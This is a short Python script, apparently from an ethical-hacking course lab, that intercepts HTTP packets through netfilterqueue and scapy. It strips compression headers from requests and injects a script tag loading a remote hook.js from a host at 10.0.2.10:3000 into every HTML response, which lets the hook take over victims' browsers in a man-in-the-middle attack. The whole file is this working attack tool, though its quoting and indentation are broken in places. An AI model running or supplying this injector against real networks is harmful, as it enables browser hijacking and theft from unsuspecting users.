import netfilterqueue
import scapy.all as scapy
import re

# netfilterqueue: Chi dung cho python < 3.7

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    sc_packet = scapy.IP(packet.get_payload())
    if sc_packet.haslayer(scapy.Raw):
        try:
            load = sc_packet[scapy.Raw].load
            if sc_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
		load = load.replace("HTTP/1.1", "HTTP/1.0")

            elif sc_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injector_code = "<script src="http://10.0.2.10:3000/hook.js"></script>"
                load = load.replace("</body>", injector_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injector_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != sc_packet[scapy.Raw].load:
                new_packet = set_load(sc_packet, load)
                packet.set_payload(str(new_packet))
                # packet.set_payload(bytes(new_packet)) python3
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()